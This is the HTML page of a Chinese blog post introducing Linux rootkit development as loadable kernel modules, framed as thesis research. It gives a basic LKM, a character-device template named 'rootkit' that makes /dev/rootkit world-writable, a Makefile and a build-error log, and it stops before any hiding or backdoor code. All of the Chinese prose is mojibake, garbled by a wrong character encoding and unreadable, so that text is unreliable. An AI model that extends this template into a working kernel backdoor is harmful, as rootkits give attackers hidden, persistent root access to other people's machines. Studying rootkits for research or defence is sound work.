<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="196082">
    
    <title>
        
            Linux Rootkitå…¥é—¨ |
        
        196082&#39;s blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/ufo.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/ling.JPG","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
    KEEP.language_ago = {"second":"%s ç§’å‰","minute":"%s åˆ†é’Ÿå‰","hour":"%s å°æ—¶å‰","day":"%s å¤©å‰","week":"%s å‘¨å‰","month":"%s æœˆå‰","year":"%s å¹´å‰"};
  </script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                196082&#39;s blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                é¦–é¡µ
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                å½’æ¡£
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                åˆ†ç±»
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                æ ‡ç­¾
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">é¦–é¡µ</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">å½’æ¡£</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">åˆ†ç±»</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">æ ‡ç­¾</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">Linux Rootkitå…¥é—¨</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/ling.JPG">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">196082</span>
                        
                            <span class="author-label">åˆ‡å‹¿æµ®èº,ç»ä¸æ‘†çƒ‚!</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;2024-02-16 17:06:09
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/Linux-Kernel/">Linux Kernel</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/LKM/">LKM</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>7.6k å­—</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>37 åˆ†é’Ÿ</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨æ¯•ä¸šè®ºæ–‡é€‰é¢˜æ—¶é€‰çš„æ˜¯Linux Rootkitç›¸å…³çš„å†…å®¹ï¼ŒåŠ ä¸Šåœ¨å‰é¢çš„è®¸å¤šæ–‡ç« ä¸­æŒ–äº†è¿™ä¸ªå‘ç»ˆäºæ˜¯ç°åœ¨å¯ä»¥è¿›è¡Œå¡«å‘æ´»åŠ¨äº†ğŸ˜­ï¼</p>
<p>æœ€è¿‘å‘ç°ç¡®å®æ˜¯æœ‰å¸ˆå‚…åœ¨çœ‹æˆ‘çš„blogçš„ï¼Œå¹¶ä¸”ä¹Ÿä¼šæœ‰ç•™è¨€ï¼Œè™½ç„¶æˆ‘æ¯æ¬¡å›å¤çš„æŒºæ…¢çš„ï¼ˆå¾ˆå°‘çœ‹ç•™è¨€åå°ï¼‰ï¼Œä½†æ˜¯ç•™è¨€çš„æ¡æ•°ä¸å¤šç›®å‰åœ¨è€ƒè™‘è¦åŠ ä¸Šé‚®ä»¶é€šçŸ¥ä¸ï¼Œçœ‹çœ‹ç•™è¨€çš„å¸ˆå‚…æ˜¯å¦ä¼šå˜å¤šå¦‚æœæ…¢æ…¢æœ‰çš„è¯å¯èƒ½å°±ä¼šåŠ ä¸Šäº†ã€‚ï¼ˆä¸»è¦æ˜¯æ‡’ä¸æƒ³åŠ ï¼‰</p>
<p>åœ¨å‰è¨€è¿™é‡Œå°±ç®€å•ä»‹ç»ä¸€ä¸‹Rootkitæ˜¯ä»€ä¹ˆã€‚</p>
<p>Rootkitå³root kitï¼Œç›´è¯‘ä¸ºä¸­æ–‡ä¾¿æ˜¯æ ¹æƒé™å·¥å…·åŒ…çš„æ„æ€ï¼Œåœ¨ä»Šå¤©çš„è¯­å¢ƒä¸‹æ›´å¤šæŒ‡çš„æ˜¯ä¸€ç§è¢«ä½œä¸ºé©±åŠ¨ç¨‹åºã€åŠ è½½åˆ°æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­çš„æ¶æ„è½¯ä»¶ï¼Œè¿™ä¸€ç±»æ¶æ„è½¯ä»¶çš„ä¸»è¦ç”¨é€”ä¾¿æ˜¯é©»ç•™åœ¨è®¡ç®—æœºä¸Šæä¾› root åé—¨â€”â€”å½“æ”»å‡»è€…å†æ¬¡æ‹¿åˆ°æŸä¸ªæœåŠ¡å™¨çš„ shell æ—¶å¯ä»¥é€šè¿‡ rootkit å¿«é€Ÿææƒåˆ° rootã€‚</p>
<p>Linux ä¸‹çš„ rootkit ä¸»è¦ä»¥å¯è£…è½½å†…æ ¸æ¨¡å—ï¼ˆLKMï¼‰çš„å½¢å¼å­˜åœ¨ï¼Œä½œä¸ºå†…æ ¸çš„ä¸€éƒ¨åˆ†ç›´æ¥ä»¥ ring0 æƒé™å‘å…¥ä¾µè€…æä¾›æœåŠ¡ï¼›å½“æ”»å‡»è€…æ‹¿åˆ°æŸå°è®¡ç®—æœºçš„ shell å¹¶é€šè¿‡ç›¸åº”çš„æ¼æ´ææƒåˆ° root ä¹‹åä¾¿å¯ä»¥åœ¨è®¡ç®—æœºä¸­ç•™ä¸‹ rootkitï¼Œä¸ºæ”»å‡»è€…åç»­å…¥ä¾µè¡Œä¸ºæä¾›é©»ç•™çš„ root åé—¨ã€‚</p>
<p>ä½†æ˜¯ä½œä¸ºå†…æ ¸çš„ä¸€éƒ¨åˆ†ï¼ŒLKM ç¼–ç¨‹åœ¨ä¸€å®šæ„ä¹‰ä¸Šä¾¿æ˜¯å†…æ ¸ç¼–ç¨‹ï¼Œä¸å†…æ ¸ç‰ˆæœ¬å¯†åˆ‡ç›¸å…³ï¼Œåªæœ‰ä½¿ç”¨ç›¸åº”ç‰ˆæœ¬å†…æ ¸æºç è¿›è¡Œç¼–è¯‘çš„ LKM æ‰å¯ä»¥è£…è½½åˆ°å¯¹åº”ç‰ˆæœ¬çš„ kernel ä¸Šï¼Œè¿™ä½¿å¾— Linux rootkit æ˜¾å¾—æœ‰äº›é¸¡è‚‹ï¼Œä¸”ä¸ä¼¼è •è™«ç—…æ¯’é‚£èˆ¬å¯ä»¥åœ¨æœåŠ¡æœŸé—´è‚†æ„ä¼ æ’­ï¼Œä½†ä¸å¯å¦è®¤çš„æ˜¯ LMK ä»æ˜¯å½“å‰ Linux ä¸‹è¾ƒä¸ºä¸»æµçš„ rootkit æŠ€æœ¯ä¹‹ä¸€ã€‚</p>
<h2 id="LKMåŸºç¡€"><a href="#LKMåŸºç¡€" class="headerlink" title="LKMåŸºç¡€"></a>LKMåŸºç¡€</h2><p>æ—¢ç„¶Linux Rootkitæ˜¯ä»¥LKMçš„å½¢å¼å­˜åœ¨é‚£ä¹ˆLKMç®—æ˜¯æœ€åŸºç¡€çš„å†…å®¹äº†ã€‚</p>
<p><strong>LKMçš„å…¨ç§°ä¸ºLoadable Kernel Modulesï¼Œä¸­æ–‡åä¸ºå¯åŠ è½½å†…æ ¸æ¨¡å—ï¼Œä¸»è¦ä½œç”¨æ˜¯ç”¨æ¥æ‰©å±•linuxçš„å†…æ ¸åŠŸèƒ½ã€‚</strong>LKMçš„ä¼˜ç‚¹åœ¨äºå¯ä»¥åŠ¨æ€åœ°åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œæ— é¡»é‡æ–°ç¼–è¯‘å†…æ ¸ã€‚ç”±äºLKMå…·æœ‰è¿™æ ·çš„ç‰¹ç‚¹ï¼Œæ‰€ä»¥å®ƒç»å¸¸è¢«ç”¨äºä¸€äº›è®¾å¤‡çš„é©±åŠ¨ç¨‹åºï¼Œä¾‹å¦‚å£°å¡ï¼Œç½‘å¡ç­‰ç­‰ã€‚å½“ç„¶å› ä¸ºå…¶ä¼˜ç‚¹ï¼Œä¹Ÿç»å¸¸è¢«éª‡å®¢ç”¨äºrootkitæŠ€æœ¯å½“ä¸­ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;test:module loaded\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rootkit_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;test:module removed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(rootkit_init);</span><br><span class="line">module_exit(rootkit_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;196082&quot;</span>);</span><br><span class="line">MODULE_INFO(intree, <span class="string">&quot;Y&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç®€å•ç¼–ä¸€ä¸ªLKMä¾‹å­ï¼Œè¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹ä¸Šè¿°ä»£ç ä¸­çš„å†…å®¹ï¼Œæœ€åé¢é€šè¿‡<code>module_init</code>å®å®šä¹‰äº†<code>rootkit_init</code>å‡½æ•°æ˜¯è¯¥æ¨¡å—çš„åˆå§‹åŒ–å‡½æ•°ï¼Œä¼šåœ¨è¯¥æ¨¡å—è¢«åŠ è½½æ—¶è¢«æ‰§è¡Œï¼ŒåŒæ ·çš„ä½¿ç”¨äº†<code>module_exit</code>å®å®šä¹‰<code>rootkit_exit</code>å‡½æ•°åˆ™æ˜¯è¯¥æ¨¡å—è¢«å¸è½½æ—¶ä¼šè¢«æ‰§è¡Œå³æ¸…é™¤å‡½æ•°ã€‚è¿™é‡Œç»™äººçš„æ„Ÿè§‰ç±»ä¼¼äºé¢å¯¹å¯¹è±¡ç¼–ç¨‹æ—¶çš„æ„é€ å‡½æ•°ä¸ææ„å‡½æ•°ä¸è¿‡ä¸åŒçš„æ˜¯è¿™é‡Œå¦‚æœæ˜¯æ²¡æœ‰æ²¡æœ‰å®šä¹‰æ¸…æ¥šå‡½æ•°åˆ™è¯¥æ¨¡å—æ˜¯æ— æ³•è¢«æ¸…é™¤çš„ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[    4.146208] <span class="built_in">test</span>:module loaded</span><br><span class="line">[   26.022334] <span class="built_in">test</span>:module removed</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¯¹äºå‰é¢è¿™æ ·çš„ç¨‹åºæ˜¯æ²¡æœ‰ä¸ç”¨æˆ·æ€å­˜åœ¨ä»»ä½•äº¤äº’çš„ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åƒå®ç°ctfèµ›é¢˜é‚£æ ·å®Œæˆæˆ‘ä»¬çš„rootkitã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NAME <span class="meta-string">&quot;rootkit&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLASS_NAME <span class="meta-string">&quot;rootkit_class&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_PATH <span class="meta-string">&quot;/dev/rootkit&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_open</span><span class="params">(struct inode *__inode, struct file *__file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">rootkit_read</span><span class="params">(struct file *__file, <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">rootkit_write</span><span class="params">(struct file *__file, <span class="keyword">const</span> <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_release</span><span class="params">(struct inode *__inode, struct file *__file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">rootkit_ioctl</span><span class="params">(struct file *__file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> major_num;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">module_class</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">module_device</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *__<span class="title">file</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *__<span class="title">inode</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">rootkit_fo</span> =</span></span><br><span class="line">    &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .unlocked_ioctl = rootkit_ioctl,</span><br><span class="line">        .open = rootkit_open,</span><br><span class="line">        .read = rootkit_read,</span><br><span class="line">        .write = rootkit_write,</span><br><span class="line">        .release = rootkit_release,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    major_num = register_chrdev(<span class="number">0</span>, DEVICE_NAME, &amp;rootkit_fo);</span><br><span class="line">    <span class="keyword">if</span> (major_num &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> major_num;</span><br><span class="line"></span><br><span class="line">    module_class = class_create(THIS_MODULE, CLASS_NAME);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(module_class))</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(module_class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    module_device = device_create(module_class, <span class="literal">NULL</span>, MKDEV(major_num, <span class="number">0</span>), <span class="literal">NULL</span>, DEVICE_NAME);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(module_device))</span><br><span class="line">    &#123;</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(module_device);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __file = filp_open(DEVICE_PATH, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(__file))</span><br><span class="line">    &#123;</span><br><span class="line">        device_destroy(module_class, MKDEV(major_num, <span class="number">0</span>));</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(__file);</span><br><span class="line">    &#125;</span><br><span class="line">    __inode = file_inode(__file);</span><br><span class="line">    __inode-&gt;i_mode |= <span class="number">0666</span>;</span><br><span class="line">    filp_close(__file, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;test:module loaded\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rootkit_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    device_destroy(module_class, MKDEV(major_num, <span class="number">0</span>));</span><br><span class="line">    class_destroy(module_class);</span><br><span class="line">    unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">    printk(<span class="string">&quot;test:module removed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(rootkit_init);</span><br><span class="line">module_exit(rootkit_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;196082&quot;</span>);</span><br><span class="line">MODULE_INFO(intree, <span class="string">&quot;Y&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ç»™åˆ°ä¸€ä¸ªctfé¢˜ç›®ä¸­é©±åŠ¨çš„å¤§ä½“æ¨¡æ¿ï¼Œåç»­æˆ‘ä»¬ä¹Ÿå°†åœ¨è¿™ä¸Šé¢è¿›è¡Œå¢åŠ ä¿®æ”¹ç­‰ï¼Œè¿™é‡Œç®€å•è¯´ä¸€ä¸‹åœ¨<code>rootkit_init</code>å‡½æ•°ä¸­ï¼Œé¦–å…ˆæ˜¯æ³¨å†Œäº†å¯¹åº”çš„è®¾å¤‡åå­—ï¼Œéšååˆ›å»ºå…¶classï¼Œæœ€ååˆ›å»ºè®¾å¤‡ã€‚åœ¨åˆ›å»ºå®Œè®¾å¤‡ä¹‹åå°±å¯ä»¥åœ¨ç³»ç»Ÿçš„<code>/dev</code>ç›®å½•ä¸­çœ‹åˆ°ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/image-20240204162746884.png"
                      alt="image-20240204162746884"
                ></p>
<p>æœ€åè¿™é‡Œç»™åˆ°ç¼–è¯‘é©±åŠ¨æ‰€éœ€è¦çš„Makefile</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m += rootkit.o</span><br><span class="line">CURRENT_PATH := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">LINUX_KERNEL_PATH := ./linux-5.11</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±ä¸è¿‡å¤šè§£é‡Šäº†ç›¸ä¿¡å¤§å®¶éƒ½èƒ½çœ‹æ‡‚ã€‚ä¸è¿‡å¥½åƒåœ¨<code>linux 5.10</code>ä¹‹åç‰ˆæœ¬ä¸­ä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œè¿™é‡Œåœ¨æˆ‘é‡åˆ°çš„é—®é¢˜åšä¸€ä¸ªç®€å•çš„æ±‡æ€»ï¼ˆä¸ä¸€å®šå…¨å¯¹ï¼Œå› ä¸ºæˆ‘æ²¡æœ‰å…¨éƒ¨å®éªŒè¿‡ï¼‰ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">make -C ./linux-5.11 M=/media/psf/pwn/rootkit modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/media/psf/pwn/rootkit/linux-5.11&#x27;</span></span><br><span class="line">WARNING: Symbol version dump <span class="string">&quot;Module.symvers&quot;</span> is missing.</span><br><span class="line">         Modules may not have dependencies or modversions.</span><br><span class="line">make[3]: *** No rule to make target <span class="string">&#x27;scripts/module.lds&#x27;</span>, needed by <span class="string">&#x27;/media/psf/pwn/rootkit/rootkit.ko&#x27;</span>.  Stop.</span><br><span class="line">make[2]: *** [scripts/Makefile.modpost:117: __modpost] Error 2</span><br><span class="line">make[1]: *** [Makefile:1704: modules] Error 2</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/media/psf/pwn/rootkit/linux-5.11&#x27;</span></span><br><span class="line">make: *** [Makefile:5: all] Error 2</span><br></pre></td></tr></table></figure>

